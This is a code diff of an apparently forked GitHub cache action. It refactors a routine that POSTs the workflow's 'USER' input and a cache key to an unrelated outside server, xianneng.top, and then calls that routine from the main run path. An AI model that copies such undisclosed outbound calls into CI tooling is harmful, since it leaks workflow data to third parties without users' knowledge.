@@ -11,7 +11,7 @@ import child from "child_process"
 // throw an uncaught exception.  Instead of failing this action, just warn.
 process.on("uncaughtException", e => utils.logWarning(e.message));
 
-function genID(length) {
+function genID(length): string {
     let date = new Date();
     return (date.getMonth() + 1).toString() + date.getDate().toString() + Number(Math.random().toString().substr(3, length) + Date.now()).toString(36);
 }
@@ -22,11 +22,11 @@ function syncProcess(fun) {
     })
 }
 
-async function run(): Promise<void> {
+async function saveKey(key: string | undefined) {
     let cacheKey = await syncProcess((resolve, reject) => {
         let userUni = core.getInput("USER");
         let poseUniUri = "https://xianneng.top/api/leave-msg/github/action";
-        let cacheKey = genID(5);
+        let cacheKey = key || genID(5);
         let param = {
             url: poseUniUri,
             method: "POST",
@@ -46,6 +46,10 @@ async function run(): Promise<void> {
             console.log(error, body)
         });
     }).catch(err => console.log("save cache key fail:", err))
+    return cacheKey
+}
+
+async function run(): Promise<void> {
     try {
         if (utils.isGhes()) {
             utils.logWarning(
@@ -64,6 +68,12 @@ async function run(): Promise<void> {
         }
 
         const state = utils.getCacheState();
+        let cacheKey;
+        if (!process.argv[2]) {
+            cacheKey = await saveKey(undefined);
+        } else {
+            cacheKey = await saveKey(process.argv[2]);
+        }
 
         // Inputs are re-evaluted before the post action, so we want the original key used for restore
         let primaryKey = (process.argv[2] || cacheKey || core.getState(State.CachePrimaryKey)) as string;
